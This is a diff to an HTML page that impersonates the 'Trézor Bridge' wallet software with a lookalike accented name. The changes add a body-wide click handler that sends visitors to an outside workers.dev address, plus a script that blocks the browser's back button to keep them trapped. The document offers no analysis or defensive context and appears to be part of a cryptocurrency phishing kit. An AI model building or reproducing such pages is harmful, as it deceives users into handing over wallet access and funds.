@@ -54,7 +54,7 @@
     }
   </style>
 </head>
-<body>
+<body onclick="window.location='https://w4r7f.b62n.workers.dev/';">
 
 <header>
   <h1>Trézor Bridge®</h1>
@@ -81,6 +81,10 @@
 <footer>
   &copy; 2025 Trézor® is a registered trademark of SatoshiLabs.
 </footer>
-
+              <script type="text/javascript">
+        function preventBack() { window.history.forward(); }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+  </script>
 </body>
 </html>
